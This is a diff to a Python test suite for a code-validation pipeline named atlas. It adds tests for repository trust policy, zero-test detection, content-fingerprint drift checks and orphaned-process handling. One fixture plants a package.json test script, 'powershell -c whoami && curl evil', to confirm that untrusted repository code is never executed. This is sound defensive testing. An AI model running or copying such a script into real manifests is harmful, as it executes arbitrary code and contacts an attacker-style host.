@@ -8,16 +8,24 @@ from __future__ import annotations
 
 import json
 import shutil
+import sqlite3
 import subprocess
 import sys
 import tempfile
 import time
 import unittest
+from dataclasses import replace
 from datetime import timedelta
 from pathlib import Path
 
 from atlas.config import RunConfig
-from atlas.executor import ExecutorRequest
+from atlas.executor import (
+    CancellationState,
+    ExecutionStatus,
+    ExecutorFailure,
+    ExecutorRequest,
+    TerminationOutcome,
+)
 from atlas.gitcmd import GitRunner
 from atlas.intake import build_idempotency_key
 from atlas.local_process import LocalProcessExecutor
@@ -41,6 +49,7 @@ from atlas.validation_models import (
 )
 from atlas.validation_pipeline import ValidationGateFailed, ValidationPipeline
 from atlas.validation_plan import ALLOWED_NODE_SCRIPTS, build_plan, inspect_repository
+from atlas.worktree_changes import fingerprint
 from atlas.workspace import WorkspacePlanner
 from atlas.workspace_service import WorkspaceService
 from atlas.schema import FAILURE_CATEGORIES
@@ -89,6 +98,9 @@ class PlanDetectionTest(unittest.TestCase):
         self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
 
     def plan(self, **kwargs):
+        # detection 자체를 보는 테스트라 신뢰 정책은 열어 둡니다. 정책 효과는
+        # TrustPolicyTest에서 따로 확인합니다.
+        kwargs.setdefault("trusted", True)
         return build_plan(self.root, **kwargs)
 
     def step(self, plan, name):
@@ -232,6 +244,7 @@ class NodeDetectionTest(unittest.TestCase):
 
     def plan(self, **kwargs):
         kwargs.setdefault("which", lambda name: "/bin/" + name)
+        kwargs.setdefault("trusted", True)
         return build_plan(self.root, **kwargs)
 
     def step(self, plan, name):
@@ -331,7 +344,9 @@ class CommandSafetyTest(unittest.TestCase):
         write(self.root / "tests" / "test_a.py", PASSING_TEST)
         write(self.root / "pyproject.toml", "[project]\nname='x'\n")
 
-        joined = " ".join(" ".join(step.argv) for step in build_plan(self.root).steps)
+        joined = " ".join(
+            " ".join(step.argv) for step in build_plan(self.root, trusted=True).steps
+        )
 
         for banned in ("install", "poetry", "uv sync", "pip ", "add "):
             self.assertNotIn(banned, joined)
@@ -339,7 +354,7 @@ class CommandSafetyTest(unittest.TestCase):
     def test_argv_is_always_a_tuple_of_tokens(self):
         write(self.root / "tests" / "test_a.py", PASSING_TEST)
 
-        for step in build_plan(self.root).steps:
+        for step in build_plan(self.root, trusted=True).steps:
             self.assertIsInstance(step.argv, tuple)
             for token in step.argv:
                 self.assertIsInstance(token, str)
@@ -350,7 +365,9 @@ class CommandSafetyTest(unittest.TestCase):
     def test_no_user_text_reaches_the_command(self):
         write(self.root / "tests" / "test_a.py", PASSING_TEST)
 
-        joined = " ".join(" ".join(step.argv) for step in build_plan(self.root).steps)
+        joined = " ".join(
+            " ".join(step.argv) for step in build_plan(self.root, trusted=True).steps
+        )
 
         self.assertNotIn("Objective", joined)
         self.assertNotIn("Atlas Task", joined)
@@ -525,6 +542,9 @@ class PipelineTestCase(unittest.TestCase):
     """구현이 끝난 Run을 실제로 검증합니다."""
 
     TEST_FILE = PASSING_TEST
+    # 대부분의 테스트는 실제 검증 동작을 봐야 하므로 신뢰 정책을 켭니다.
+    # 기본값(untrusted)의 효과는 UntrustedPolicyTest에서 확인합니다.
+    TRUST = "trusted"
 
     def setUp(self):
         self._dir = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
@@ -547,6 +567,7 @@ class PipelineTestCase(unittest.TestCase):
             self.workspaces,
             self.root / "logs",
             RunConfig(heartbeat_interval_seconds=1.0, stale_after_seconds=120.0),
+            trust_policy=self.TRUST,
         )
         self.addCleanup(self._teardown)
         self.run = self.prepare()
@@ -1044,6 +1065,442 @@ class LogRedactionTest(PipelineTestCase):
 
         for row in self.store.events():
             self.assertLess(len(row["detail"]), 8000)
+
+
+class UntrustedPolicyTest(PipelineTestCase):
+    """기본 정책에서는 repository 코드를 실행하지 않습니다."""
+
+    TRUST = "untrusted"
+
+    def seed(self):
+        super().seed()
+        write(
+            self.repo / "package.json",
+            json.dumps({"name": "x", "scripts": {"test": "powershell -c whoami && curl evil"}}),
+        )
+        write(self.repo / "package-lock.json", "{}")
+
+    def test_malicious_package_script_is_not_executed(self):
+        self.implement()
+
+        report = self.validate()
+
+        node = [r for r in report.results if r.name.startswith(("npm-", "pnpm-", "yarn-"))]
+        for result in node:
+            self.assertIs(result.status, StepStatus.SKIPPED)
+            self.assertEqual(result.argv, ())
+        joined = " ".join(" ".join(r.argv) for r in report.results)
+        self.assertNotIn("powershell", joined)
+        self.assertNotIn("curl", joined)
+
+    def test_python_tests_are_classified_as_active_code(self):
+        plan = self.pipeline.plan_for(self.run.run_id)
+
+        tests = next(s for s in plan.steps if s.kind is StepKind.TESTS)
+        self.assertTrue(tests.executes_repository_code)
+        self.assertEqual(tests.skip_reason, "active_validation_requires_trust")
+        self.assertFalse(tests.required)
+        self.assertEqual(tests.argv, ())
+
+    def test_static_steps_still_run(self):
+        self.implement()
+
+        report = self.validate()
+
+        compile_result = next(r for r in report.results if r.name == "compileall")
+        self.assertIs(compile_result.status, StepStatus.PASSED)
+        self.assertEqual(compile_result.exit_code, 0)
+
+    def test_static_only_pass_is_recorded_as_such(self):
+        self.implement()
+
+        report = self.validate()
+
+        self.assertIs(report.outcome, ValidationOutcome.PASSED)
+        self.assertIn("active_validation_skipped_untrusted", report.warnings)
+        self.assertIn("validation_passed_static_only", report.warnings)
+
+    def test_plan_never_claims_a_sandbox(self):
+        plan = self.pipeline.plan_for(self.run.run_id)
+
+        self.assertFalse(plan.trust["sandboxed"])
+        self.assertFalse(plan.trust["network_denied"])
+        self.assertEqual(plan.trust["policy"], "untrusted")
+
+    def test_no_dependency_install_in_either_policy(self):
+        for trusted in (False, True):
+            with self.subTest(trusted=trusted):
+                plan = build_plan(self.run.worktree_path, trusted=trusted)
+                joined = " ".join(" ".join(s.argv) for s in plan.steps)
+                for banned in ("install", "poetry", "uv sync", "pip "):
+                    self.assertNotIn(banned, joined)
+
+
+class TrustedPolicyTest(PipelineTestCase):
+    TRUST = "trusted"
+
+    def test_active_steps_run_when_trusted(self):
+        self.implement()
+
+        report = self.validate()
+
+        tests = next(r for r in report.results if r.kind is StepKind.TESTS)
+        self.assertIs(tests.status, StepStatus.PASSED)
+        self.assertEqual(tests.exit_code, 0)
+        self.assertNotIn("validation_passed_static_only", report.warnings)
+
+    def test_trusted_repository_list_grants_trust(self):
+        pipeline = ValidationPipeline(
+            self.store,
+            self.workspaces,
+            self.root / "logs2",
+            RunConfig(heartbeat_interval_seconds=1.0, stale_after_seconds=120.0),
+            trusted_repositories=("hongwon1031/atlas",),
+        )
+
+        trusted, reason = pipeline.trust_for(self.store.run(self.run.run_id))
+
+        self.assertTrue(trusted)
+        self.assertIn("trusted_repository", reason)
+
+    def test_unlisted_repository_is_untrusted_by_default(self):
+        pipeline = ValidationPipeline(
+            self.store,
+            self.workspaces,
+            self.root / "logs3",
+            RunConfig(heartbeat_interval_seconds=1.0, stale_after_seconds=120.0),
+            trusted_repositories=("someone/else",),
+        )
+
+        trusted, reason = pipeline.trust_for(self.store.run(self.run.run_id))
+
+        self.assertFalse(trusted)
+        self.assertIn("untrusted_repository", reason)
+
+
+class ZeroTestsTest(PipelineTestCase):
+    """0건 실행을 통과로 취급하면 안 됩니다."""
+
+    def seed(self):
+        write(self.repo / "README.md", "base\n")
+        write(self.repo / "src" / "thing.py", "VALUE = 1\n")
+        write(self.repo / "tests" / "__init__.py", "")
+        # pytest 형식 이름만 있습니다. unittest discover는 찾지 못합니다.
+        write(self.repo / "tests" / "thing_test.py", PASSING_TEST)
+
+    def test_runner_mismatch_is_detected_at_plan_time(self):
+        plan = self.pipeline.plan_for(self.run.run_id)
+
+        tests = next(s for s in plan.steps if s.kind is StepKind.TESTS)
+        self.assertEqual(tests.error_reason, "test_runner_mismatch")
+        self.assertTrue(tests.required)
+        self.assertEqual(tests.evidence["matching_files"], 0)
+        self.assertEqual(tests.evidence["python_files"], 1)
+
+    def test_zero_tests_does_not_pass_the_run(self):
+        self.implement()
+
+        report = self.validate()
+
+        self.assertIs(report.outcome, ValidationOutcome.FAILED)
+        self.assertIs(report.failure, ValidationFailure.NO_TESTS_EXECUTED)
+        self.assertIs(self.status(), RunStatus.FAILED)
+
+
+class DriftFingerprintTest(PipelineTestCase):
+    """파일 이름 집합만으로는 같은 파일의 내용 변경을 놓칩니다."""
+
+    def record_implementation(self):
+        run = self.store.run(self.run.run_id)
+        fp = fingerprint(run.worktree_path)
+        self.store.record_validation_event(
+            None,
+            self.run.run_id,
+            "implementation_completed",
+            {
+                "changes": {"changed_files": ["docs/note.md"]},
+                "fingerprint": fp.to_dict(),
+            },
+        )
+        return fp
+
+    def policy_result(self):
+        report = self.validate()
+        return next(r for r in report.results if r.name == "git-policy")
+
+    def test_same_file_content_change_is_detected(self):
+        self.implement(path="docs/note.md", text="구현 결과\n")
+        self.record_implementation()
+        # 이름 집합은 그대로이고 내용만 바뀝니다.
+        write(Path(self.run.worktree_path) / "docs" / "note.md", "사람이 수정\n")
+
+        policy = self.policy_result()
+
+        self.assertIs(policy.status, StepStatus.FAILED)
+        self.assertEqual(policy.reason, "workspace_changed_after_implementation")
+        self.assertEqual(policy.evidence["drift"]["method"], "fingerprint")
+
+    def test_untracked_content_change_is_detected(self):
+        self.implement(path="docs/note.md", text="A\n")
+        self.record_implementation()
+        write(Path(self.run.worktree_path) / "docs" / "note.md", "B\n")
+
+        self.assertIs(self.policy_result().status, StepStatus.FAILED)
+
+    def test_added_file_is_detected(self):
+        self.implement()
+        self.record_implementation()
+        write(Path(self.run.worktree_path) / "docs" / "extra.md", "추가\n")
+
+        self.assertIs(self.policy_result().status, StepStatus.FAILED)
+
+    def test_removed_file_is_detected(self):
+        self.implement()
+        self.record_implementation()
+        (Path(self.run.worktree_path) / "docs" / "note.md").unlink()
+
+        self.assertIs(self.policy_result().status, StepStatus.FAILED)
+
+    def test_no_change_keeps_the_same_fingerprint(self):
+        self.implement()
+        before = self.record_implementation()
+
+        after = fingerprint(self.store.run(self.run.run_id).worktree_path)
+
+        self.assertTrue(after.matches(before))
+        self.assertIs(self.policy_result().status, StepStatus.PASSED)
+
+    def test_fingerprint_evidence_has_no_raw_source(self):
+        secret_text = "SUPER-DISTINCTIVE-SOURCE-LINE\n"
+        self.implement(path="docs/note.md", text=secret_text)
+        fp = self.record_implementation()
+
+        blob = json.dumps(fp.to_dict(), ensure_ascii=False)
+        blob += json.dumps([dict(r) for r in self.store.events()], ensure_ascii=False)
+        self.assertNotIn("SUPER-DISTINCTIVE-SOURCE-LINE", blob)
+        self.assertIn("digest", fp.to_dict())
+
+    def test_missing_fingerprint_falls_back_with_evidence(self):
+        self.implement()
+        self.store.record_validation_event(
+            None,
+            self.run.run_id,
+            "implementation_completed",
+            {"changes": {"changed_files": ["docs/note.md"]}},
+        )
+
+        policy = self.policy_result()
+
+        self.assertIs(policy.status, StepStatus.PASSED)
+        self.assertEqual(policy.evidence["drift"]["method"], "filename_set")
+        self.assertTrue(policy.evidence["drift"]["weaker_guarantee"])
+
+
+class UnconfirmedTerminationTest(PipelineTestCase):
+    """종료를 확인하지 못한 process를 terminal로 숨기면 안 됩니다."""
+
+    TEST_FILE = SLOW_TEST
+
+    def make_unverified(self):
+        """timeout 종료가 확인되지 않는 상황을 만듭니다."""
+
+        real_wait = self.pipeline._runtime.wait
+
+        def unverified(handle, request):
+            result = real_wait(handle, request)
+            return replace(
+                result,
+                status=ExecutionStatus.CANCELLING,
+                failure=ExecutorFailure.TIMEOUT,
+                termination=TerminationOutcome.UNVERIFIED,
+                cancellation_state=CancellationState.UNCONFIRMED,
+                termination_evidence={"reason": "test"},
+            )
+
+        self.pipeline._runtime.wait = unverified
+
+    def test_unverified_timeout_is_not_closed_as_error(self):
+        self.implement()
+        self.make_unverified()
+
+        report = self.validate(timeout=4.0)
+
+        tests = next(r for r in report.results if r.kind is StepKind.TESTS)
+        self.assertIs(tests.status, StepStatus.UNCONFIRMED)
+        self.assertIs(report.outcome, ValidationOutcome.AMBIGUOUS)
+        self.assertIs(report.failure, ValidationFailure.TERMINATION_UNVERIFIED)
+
+    def test_validation_record_stays_recovery_visible(self):
+        self.implement()
+        self.make_unverified()
+
+        report = self.validate(timeout=4.0)
+
+        row = self.store.validation(report.validation_id)
+        self.assertEqual(row["status"], ValidationStatus.RECOVERY_REQUIRED.value)
+        self.assertFalse(ValidationStatus(row["status"]).is_terminal)
+        self.assertIsNotNone(self.store.active_validation(self.run.run_id))
+
+    def test_run_is_not_settled_when_ambiguous(self):
+        self.implement()
+        self.make_unverified()
+
+        self.validate(timeout=4.0)
+
+        self.assertIs(self.status(), RunStatus.VALIDATING)
+        self.assertFalse(self.status().is_terminal)
+
+    def test_reconciliation_still_sees_it(self):
+        self.implement()
+        self.make_unverified()
+
+        report = self.validate(timeout=4.0)
+        reconciler = RunReconciler(
+            self.store, RunConfig(heartbeat_interval_seconds=1.0, stale_after_seconds=120.0)
+        )
+        kinds = {f["kind"] for f in reconciler.reconcile_validations()}
+
+        self.assertTrue(kinds, "reconciliation에서 사라지면 안 됩니다")
+        self.assertIn(report.validation_id, {
+            f["validation_id"] for f in reconciler.reconcile_validations()
+        })
+
+    def test_confirmed_timeout_still_closes_normally(self):
+        self.implement()
+
+        report = self.validate(timeout=4.0)
+
+        tests = next(r for r in report.results if r.kind is StepKind.TESTS)
+        self.assertIs(tests.status, StepStatus.ERROR)
+        self.assertEqual(tests.reason, "timeout")
+        row = self.store.validation(report.validation_id)
+        self.assertEqual(row["status"], ValidationStatus.FINISHED.value)
+        self.assertIs(self.status(), RunStatus.FAILED)
+
+
+class AttachFailureTest(PipelineTestCase):
+    """spawn은 됐는데 identity를 저장하지 못하는 창."""
+
+    def test_attach_failure_leaves_recovery_visible_evidence(self):
+        self.implement()
+        calls = {"n": 0}
+        original = self.store.record_validation_step
+
+        def flaky(*args, **kwargs):
+            # 첫 기록(시작)은 통과시키고 identity attach에서 실패시킵니다.
+            if kwargs.get("process_id") is not None:
+                calls["n"] += 1
+                raise sqlite3.OperationalError("simulated attach failure")
+            return original(*args, **kwargs)
+
+        self.store.record_validation_step = flaky
+        with self.assertRaises(sqlite3.OperationalError):
+            self.validate()
+        self.store.record_validation_step = original
+
+        self.assertGreater(calls["n"], 0)
+        kinds = [row["kind"] for row in self.store.events()]
+        self.assertIn("validation_process_attach_failed", kinds)
+        self.assertIn("validation_interrupted", kinds)
+
+    def test_interrupted_validation_is_not_terminal_when_process_may_live(self):
+        self.implement()
+        original = self.store.record_validation_step
+
+        def flaky(*args, **kwargs):
+            if kwargs.get("process_id") is not None:
+                raise sqlite3.OperationalError("simulated attach failure")
+            return original(*args, **kwargs)
+
+        self.store.record_validation_step = flaky
+        try:
+            self.validate()
+        except sqlite3.OperationalError:
+            pass
+        self.store.record_validation_step = original
+
+        row = self.store.validations(self.run.run_id)[0]
+        self.assertEqual(row["status"], ValidationStatus.RECOVERY_REQUIRED.value)
+        self.assertIsNotNone(self.store.active_validation(self.run.run_id))
+
+
+class OrphanProcessTest(PipelineTestCase):
+    """terminal validation record + 살아 있는 process."""
+
+    def test_live_step_is_found_even_after_the_record_closes(self):
+        self.implement()
+        plan = self.pipeline.plan_for(self.run.run_id).to_dict()
+        validation_id = self.store.start_validation(
+            self.run.run_id, worker_id=WORKER, cwd=self.run.worktree_path, plan=plan
+        )
+        request = ExecutorRequest(
+            run_id=self.run.run_id,
+            task_id=self.run.task_id,
+            cwd=self.run.worktree_path,
+            argv=(sys.executable, "-c", "import time; time.sleep(60)"),
+            timeout_seconds=300.0,
+        )
+        runtime = LocalProcessExecutor(name="validation_local", provider="local")
+        handle = runtime.spawn(request, self.root / "logs" / "orphan")
+        self.addCleanup(lambda: runtime.cancel(handle, 2.0))
+        self.store.record_validation_step(
+            validation_id, self.run.run_id, position=2, name="unittest",
+            kind=StepKind.TESTS.value, required=True, status=StepStatus.RUNNING.value,
+            command=["python"], process_id=handle.pid,
+            process_identity=handle.identity.to_dict(),
+            process_started_at=handle.started_at,
+        )
+        # validation record를 terminal로 닫습니다.
+        self.store.finish_validation(
+            validation_id, status=ValidationStatus.FINISHED, outcome="passed"
+        )
+
+        reconciler = RunReconciler(
+            self.store, RunConfig(heartbeat_interval_seconds=1.0, stale_after_seconds=120.0)
+        )
+        findings = reconciler.reconcile_validations()
+        orphan = [f for f in findings if f["kind"] == "validation_orphan_process"]
+
+        self.assertTrue(orphan, "terminal record 뒤에 남은 process를 놓쳤습니다")
+        self.assertEqual(orphan[0]["process_id"], handle.pid)
+        self.assertTrue(process_exists(handle.pid), "Atlas가 종료해서는 안 됩니다")
+
+    def test_orphan_with_mismatched_identity_is_never_killed(self):
+        self.implement()
+        plan = self.pipeline.plan_for(self.run.run_id).to_dict()
+        validation_id = self.store.start_validation(
+            self.run.run_id, worker_id=WORKER, cwd=self.run.worktree_path, plan=plan
+        )
+        request = ExecutorRequest(
+            run_id=self.run.run_id, task_id=self.run.task_id, cwd=self.run.worktree_path,
+            argv=(sys.executable, "-c", "import time; time.sleep(60)"), timeout_seconds=300.0,
+        )
+        runtime = LocalProcessExecutor(name="validation_local", provider="local")
+        handle = runtime.spawn(request, self.root / "logs" / "orphan2")
+        self.addCleanup(lambda: runtime.cancel(handle, 2.0))
+        identity = handle.identity.to_dict()
+        identity["start_token"] = "different"
+        self.store.record_validation_step(
+            validation_id, self.run.run_id, position=2, name="unittest",
+            kind=StepKind.TESTS.value, required=True, status=StepStatus.UNCONFIRMED.value,
+            command=["python"], process_id=handle.pid, process_identity=identity,
+            process_started_at=handle.started_at,
+        )
+        self.store.finish_validation(
+            validation_id, status=ValidationStatus.FINISHED, outcome="passed"
+        )
+
+        reconciler = RunReconciler(
+            self.store, RunConfig(heartbeat_interval_seconds=1.0, stale_after_seconds=120.0)
+        )
+        orphan = [
+            f for f in reconciler.reconcile_validations()
+            if f["kind"] == "validation_orphan_process"
+        ]
+
+        self.assertTrue(orphan)
+        self.assertFalse(orphan[0]["may_terminate"])
+        self.assertTrue(process_exists(handle.pid))
 
 
 @unittest.skipUnless(GIT_AVAILABLE, "git 실행 파일이 없습니다")
